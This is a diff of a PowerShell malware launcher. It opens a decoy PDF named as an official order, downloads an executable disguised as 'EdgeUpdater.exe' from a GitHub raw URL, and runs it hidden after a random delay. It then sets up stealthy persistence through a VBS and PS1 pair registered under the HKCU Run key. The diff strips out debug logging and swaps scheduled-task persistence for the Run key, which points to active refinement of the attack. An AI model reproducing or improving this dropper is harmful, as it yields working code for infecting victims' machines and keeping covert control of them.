@@ -1,13 +1,12 @@
-# launcher.ps1 - DEBUG VERSION - tell me exactly what the fuck is happening
-$ErrorActionPreference = 'Continue'
+# launcher.ps1 - SIMPLE HKCU\Run + VBS only (no schtasks, no XML bullshit)
+$ErrorActionPreference = 'SilentlyContinue'
 
 function log($msg) {
     $timestamp = Get-Date -Format "HH:mm:ss"
     Write-Host "[$timestamp] $msg" -ForegroundColor Cyan
-    "[$timestamp] $msg" | Out-File "$env:APPDATA\Microsoft\Windows\Caches\launcher-debug.log" -Append -Force
 }
 
-log "=== LAUNCHER STARTED VIA LNK ==="
+log "=== LAUNCHER STARTED ==="
 
 $persistBase = "$env:APPDATA\Microsoft\Windows\Libraries"
 $cache = "$env:APPDATA\Microsoft\Windows\Caches"
@@ -15,93 +14,65 @@ New-Item -ItemType Directory -Path $persistBase -Force | Out-Null
 New-Item -ItemType Directory -Path $cache -Force | Out-Null
 
 $pdfUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/1b8f22c806de43fe97c6cd555f455d166591d54d/assets/Nakaz_No._661_vid_02.03.2026.pdf"
-$exeUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/EdgeUpdater.exe"   # switched to main branch for reliability
+$exeUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/assets/EdgeUpdater.exe"
 
 $pdfPath = "$cache\doc.pdf"
 $exePath = "$cache\helper.exe"
 
 $headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
 
-log "Downloading PDF..."
-try {
-    Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing -TimeoutSec 20
-    log "PDF downloaded - size: $((Get-Item $pdfPath).Length) bytes"
-} catch { log "PDF failed: $_" }
+log "Downloading PDF + EXE..."
+try { Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing } catch {}
+try { Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing } catch {}
 
 if (Test-Path $pdfPath) {
-    try { Start-Process $pdfPath -Verb Open; log "PDF opened" } catch { log "PDF open failed" }
+    try { Start-Process $pdfPath -Verb Open } catch { & rundll32 url.dll,FileProtocolHandler $pdfPath }
+    log "PDF opened"
 }
 
-log "Downloading EXE..."
-try {
-    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing -TimeoutSec 20
-    log "EXE downloaded - size: $((Get-Item $exePath).Length) bytes"
-} catch { log "EXE download failed: $_" }
+Start-Sleep -Seconds (Get-Random -Min 20 -Max 45)
 
-Start-Sleep -Seconds (Get-Random -Min 15 -Max 35)
-
-log "Launching EXE via WScript..."
+log "Launching EXE..."
 try {
     $wsh = New-Object -ComObject WScript.Shell
     $wsh.Run("`"$exePath`"", 0, $false)
-    log "WScript launch attempted"
+    log "EXE launched via WScript"
 } catch {
     Start-Process $exePath -WindowStyle Hidden
-    log "Fallback Start-Process used"
+    log "EXE launched via fallback"
 }
 
-# Persistence
-log "Setting up persistence..."
+# SIMPLE PERSISTENCE - HKCU Run + VBS
+log "Setting up simple persistence..."
 $randName = "CacheLib-$(Get-Random -Min 100000 -Max 999999)"
 $vbsPath = "$persistBase\$randName.vbs"
 $syncPath = "$persistBase\$randName.ps1"
-$taskName = "Windows Library Update Task $randName"
 
 $vbsContent = @"
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -File ""$syncPath""", 0, False
 "@
 $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force
-log "VBS written to $vbsPath"
 
 $syncContent = @"
-`$ErrorActionPreference = 'Continue'
-`$log = `"$env:APPDATA\Microsoft\Windows\Caches\sync-debug.log`"
-`"$(Get-Date) - Sync started`" | Out-File `$log -Append
-Start-Sleep -Milliseconds (Get-Random -Min 5000 -Max 12000)
+`$ErrorActionPreference = 'SilentlyContinue'
+Start-Sleep -Milliseconds (Get-Random -Min 5000 -Max 15000)
 `$exeUrl = `"$exeUrl`"
-`$exePath = `"$exePath`"
+`$exePath = `"$cache\helper.exe`"
 if (-not (Test-Path `$exePath)) {
-    try { Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing } catch { `"EXE redownload failed`" | Out-File `$log -Append }
+    try { Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing } catch {}
 }
 try {
     `$wsh = New-Object -ComObject WScript.Shell
     `$wsh.Run("`"`$exePath`"", 0, `$false)
-    `"EXE launched via WScript`" | Out-File `$log -Append
-} catch {
-    Start-Process `$exePath -WindowStyle Hidden
-    `"EXE launched via fallback`" | Out-File `$log -Append
-}
+} catch { Start-Process `$exePath -WindowStyle Hidden }
 "@
 $syncContent | Out-File -FilePath $syncPath -Encoding UTF8 -Force
-log "Sync.ps1 written"
 
-# schtasks
-$xml = @"
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
-  <Principals><Principal id="Author"><UserId>$env:USERNAME</UserId><LogonType>InteractiveToken</LogonType></Principal></Principals>
-  <Settings><Hidden>true</Hidden><AllowStartIfOnBatteries>true</AllowStartIfOnBatteries><DontStopIfGoingOnBatteries>true</DontStopIfGoingOnBatteries></Settings>
-  <Actions><Exec><Command>wscript.exe</Command><Arguments>"$vbsPath"</Arguments></Exec></Actions>
-</Task>
-"@
-$xml | Out-File "$env:TEMP\task.xml" -Encoding UTF8
-schtasks /Create /TN "$taskName" /XML "$env:TEMP\task.xml" /F | Out-Null
-Remove-Item "$env:TEMP\task.xml" -Force
-log "Scheduled task created: $taskName"
+# Register in HKCU\Run (this is what will survive reboot)
+$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $runKey -Name $randName -Value "wscript.exe `"$vbsPath`"" -Type String -Force
 
+log "Persistence registered via HKCU Run: $randName"
 Start-Process wscript.exe -ArgumentList $vbsPath -WindowStyle Hidden
-log "Initial VBS fired"
-
-log "=== LAUNCHER FINISHED ==="
+log "Initial VBS fired - reboot now"
